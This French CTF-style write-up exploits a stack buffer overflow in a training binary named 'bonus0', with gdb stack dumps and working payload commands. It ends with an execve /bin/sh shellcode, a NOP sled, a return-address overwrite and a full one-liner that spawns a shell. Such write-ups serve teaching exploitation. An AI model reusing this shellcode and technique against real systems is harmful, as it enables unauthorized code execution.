# Shell Code Exploitation

En décompilant l'exécutable, on remarque que le programme effectue deux demandes en entrée standard. Un buffer de `54` caractères est présent dans la fonction `main`.

Le `buffer` étant déclaré dans la fonction `main`, il nous est impossible d'exploiter un `overflow` pour écraser l'adresse de retour de la fonction `pp`. En effet, la fonction `pp` étant appelée depuis la fonction `main`, ses arguments dans la `stack` se situent avant les arguments de la fonction `main`. On peut le représenter de la manière suivante :
```
----------------------- pp
[...]
[...]
[ret]
----------------------- main
[...]
[buffer]
[...]
[ret]
-----------------------
```
Il parait donc intéressant ici d'exploiter un `overflow` sur le buffer de la fonction `main` pour écraser l'adresse de retour de la fonction `main` et ainsi exécuter notre `shell code`.

Tout d'abord, déterminons où se situe l'adresse de retour de la fonction `main`. Nous savons qu'elle est située à `ebp+0x04`. Avec `gdb`, on `break` dans la fonction `main`, puis on affiche cette valeur.

Au préalable, nous allons créer un fichier qui va contenir des commandes `python` qui nous permettrons de fournir des entrées au programme via `gdb`.
```
> cat /tmp/basic_input
python -c 'print "A"*4 + "\n"' ; python -c 'print "B"*4'
> chmod 777 /tmp/basic_input
```

```
> gdb bonus0
[...]
> (gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   %ebp
   0x080485a5 <+1>:	mov    %esp,%ebp
   0x080485a7 <+3>:	and    $0xfffffff0,%esp
   0x080485aa <+6>:	sub    $0x40,%esp
   0x080485ad <+9>:	lea    0x16(%esp),%eax
   0x080485b1 <+13>:	mov    %eax,(%esp)
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave  
   0x080485cb <+39>:	ret    
End of assembler dump.
> (gdb) b *0x080485b4
Breakpoint 1 at 0x80485b4
> (gdb) r < <(/tmp/basic_input)
[...]
> (gdb) x $ebp+0x04
0xbffff6ec:	0xb7e454d3
> (gdb) x 0xb7e454d3
0xb7e454d3 <__libc_start_main+243>:	0xe8240489
```
L'adresse de retour de la fonction `main` est donc située à l'adresse `0xbffff6ec`

La fonction `pp` va copier les deux entrée de l'entrée standard dans le `buffer` et y concatener la deuxième entrée en ajoutant un espace au milieu. Autrement dit :
```
Si
Entrée_1 = AAAA
Entrée_2 = BBBB

Alors
Buffer = AAAA BBBB
```
Cependant, la fonction `p` ne copie que les `20` premiers caractères d'une entrée dans un `buffer`. Ce qui veut dire que si `entrée_1` fait `20` caractères ou plus, la seconde entrée fera partie de la première. Ainsi :
```
Si
Entrée_1 = AAAAAAAAAAAAAAAAAAAA
Entrée_2 = BBBB

Alors
Buffer = AAAAAAAAAAAAAAAAAAAABBBB BBBB
```
Cette propriété est due au `strcat` qui attend un `\0` pour terminer de copier `entrée_1` dans le `buffer`. On peut le visualiser dans `gdb` en faisant un `break` au niveau du `strcat` et en imprimant la `stack`.
```
> (gdb) disas pp
[...]
   0x08048592 <+116>:	mov    0x8(%ebp),%eax
   0x08048595 <+119>:	mov    %eax,(%esp)
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    $0x50,%esp
   0x080485a0 <+130>:	pop    %ebx
   0x080485a1 <+131>:	pop    %edi
[...]
> (gdb) b *0x08048598
Breakpoint 2 at 0x08048598
> (gdb) c
[...]
```
```
> (gdb) x/20wx $esp
0xbffff640:	0xbffff6b6	0xbffff67c	0x00000000	0xb7fd0ff4
0xbffff650:	0xbffff69e	0xbffff69f	0x00000001	0xffffffff
0xbffff660:	0xbffff69f	0xbffff69e	0x41414141	0x00000000
                                    ^
                                    AAAA
                                    entrée_1
                                    (second argument de
                                    strcat)
0xbffff670:	0x00000000	0x00000000	0x00000000	0x42424242
                                                ^
                                                BBBB
                                                entrée_2
0xbffff680:	0x00000000	0x00000000	0x00000000	0x00000000
```
Voyons à présent à quoi ressemble notre `buffer` après l'appel à la fonction `strcat`. Pour cela, il nous faut d'abord déterminer l'adresse du `buffer`. Puisque l'on est au niveau du `strcat` dans `gdb`, il suffit d'imprimer `$esp`, qui contient le premier argument de `strcat`, donc de notre `buffer`.
```
> (gdb) x $esp
0xbffff640:	0xbffff6b6
```
L'adresse du `buffer` est donc `0xbffff6b6`. On peut donc imprimer notre `buffer` après l'appel à `strcat`.
```
> (gdb) ni
[...]
> (gdb) x/50wx $esp
0xbffff640:	0xbffff6b6	0xbffff67c	0x00000000	0xb7fd0ff4
0xbffff650:	0xbffff69e	0xbffff69f	0x00000001	0xffffffff
0xbffff660:	0xbffff69f	0xbffff69e	0x41414141	0x00000000
0xbffff670:	0x00000000	0x00000000	0x00000000	0x42424242
0xbffff680:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff690:	0xb7fd0ff4	0x00000000	0xbffff6e8	0x080485b9
0xbffff6a0:	0xbffff6b6	0x080498d8	0x00000001	0x0804835d
0xbffff6b0:	0xb7fd13e4	0x41410016	0x42204141	0x00424242
                        ^
                        buffer
0xbffff6c0:	0xffffffff	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff6d0:	0xb7fed280	0x00000000	0x080485d9	0xb7fd0ff4
0xbffff6e0:	0x080485d0	0x00000000	0x00000000	0xb7e454d3
                                                ^
                                                ret main
0xbffff6f0:	0x00000001	0xbffff784	0xbffff78c	0xb7fdc858
0xbffff700:	0x00000000	0xbffff71c
```
Avec cette visualisation, on peut représenter nos `input` de manière abstraite :
```
Entrée_1 : AAAAAAAAAAAAAAAAAAAA
Entrée_2 : BBBBBBBBBBBBBBXXXXB
```
`XXXX` représente l'adresse de retour de notre choix. Visualisons d'abord cette entrée dans `gdb` :
```
> cat /tmp/abstract_input
python -c 'print "A"*20 + "\n"' ; python -c 'print "B"*14 + "XXXX" + "B"'
> chmod 777 /tmp/abstract_input
```
```
> (gdb) r < <(/tmp/asbtract_input)
[...]
> (gdb) ni
[...]
> (gdb) x/50wx $esp
x/50wx $esp
0xbffff640:	0xbffff6b6	0xbffff67c	0x00000000	0xb7fd0ff4
0xbffff650:	0xbffff69e	0xbffff69f	0x00000001	0xffffffff
0xbffff660:	0xbffff69f	0xbffff69e	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x42424242
0xbffff680:	0x42424242	0x42424242	0x58584242	0x00425858
0xbffff690:	0xb7fd0ff4	0x00000000	0xbffff6e8	0x080485b9
0xbffff6a0:	0xbffff6b6	0x080498d8	0x00000001	0x0804835d
0xbffff6b0:	0xb7fd13e4	0x41410016	0x41414141	0x41414141
                        ^
                        entrée_1
0xbffff6c0:	0x41414141	0x41414141	0x42424141	0x42424242
                                    ^
                                    entrée_2
                                    (première occurence)
0xbffff6d0:	0x42424242	0x42424242	0x58585858	0x42422042
                                                ^
                                                entrée_2
                                                (seconde occurence)
0xbffff6e0:	0x42424242	0x42424242	0x42424242	0x58585858
                                                ^
                                                ret main écrasée
0xbffff6f0:	0x00000042	0xbffff784	0xbffff78c	0xb7fdc858
0xbffff700:	0x00000000	0xbffff71c
```
On voit bien ici l'effet du `strcat` qui ne détecte pas de `\0` pour notre première entrée. De plus, on voit ici que l'on a réussi à écraser l'adresse de retour de la fonction `main`. Nous somme donc sur la bonne voie.

La prochaine étape consiste à stocker notre `shell code` et à y rediriger notre code. Nous avons remarqué que la fonction `read` située dans la fonction `p` stockait les entrées de l'entrée standard dans un unique `buffer`. Pour le vérifier, on peut `break` dans la fonction `p` juste après l'appel à la fonction `read`.
```
> (gdb) disas p
[...]
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
[...]
> (gdb) b *0x080484e6
[...]
> (gdb) r < <(/tmp/abstract_input)
[...]
> (gdb) x/20wx $esp
0xbfffe620:	0x00000000	0xbfffe630	0x00001000	0x00000000
0xbfffe630:	0x41414141	0x41414141	0x41414141	0x41414141
            ^
            entrée_1
0xbfffe640:	0x41414141	0x00000a0a	0x00000000	0x00000000
0xbfffe650:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe660:	0x00000000	0x00000000	0x00000000	0x00000000
> (gdb) c
[...]
> (gdb) x/20wx $esp
0xbfffe620:	0x00000000	0xbfffe630	0x00001000	0x00000000
0xbfffe630:	0x42424242	0x42424242	0x42424242	0x58584242
            ^
            entrée_2
0xbfffe640:	0x0a425858	0x00000a00	0x00000000	0x00000000
0xbfffe650:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe660:	0x00000000	0x00000000	0x00000000	0x00000000
```
On confirme bien que le `buffer` utilisé par `read` est constant. Notre `entrée_2` ne faisant pas plus de `19` caractères, il serait envisageable de stocker notre `shell code` à la suite de `entrée_1`, `entrée_2` n'allant pas l'écraser au second `read` puisque sa taille est inférieure à celle de `entrée_1`. On peut également envisager d'y ajouter une série d'instructions `NOP` pour être sûr de tomber sur notre `shell code` lors de notre redirection. Ainsi, on peut représenter nos entrées de cette manière :
```
Entrée_1 : AAAAAAAAAAAAAAAAAAAA + NOP*100 + shell_code
Entrée_2 : BBBBBBBBBBBBBBXXXXB
```
Nous utiliserons ce `shell code` :
```
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40na\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```
Nous devons donc déterminer notre adresse de retour. Rappelons-nous la `stack` après un appel à `read` :
```
0xbfffe620:	0x00000000	0xbfffe630	0x00001000	0x00000000
0xbfffe630:	0x41414141	0x41414141	0x41414141	0x41414141
            ^
            entrée_1
0xbfffe640:	0x41414141	0x00000a0a	0x00000000	0x00000000
                        ^
                        adresse de retour
0xbfffe650:	0x00000000	0x00000000	0x00000000	0x00000000
0xbfffe660:	0x00000000	0x00000000	0x00000000	0x00000000
```
Notre `shell code` sera situé après nos `20` `A`. L'adresse de retour est donc `0xbfffe644`.

Nous pouvons à présente construire nos entrées.

**Entrée_1**
```
python -c 'print "A"*20 + "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'
```
**Entrée_2**
```
python -c 'print "B"*14 + "\x44\xe6\xff\xbf" + "B"'
```

On exécute cette commande pour ouvrir un `shell` :
```
(python -c 'print "A"*20 + "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; python -c 'print"B"*14 + "\x44\xe6\xff\xbf" + "B"'; cat) | ./bonus0
```
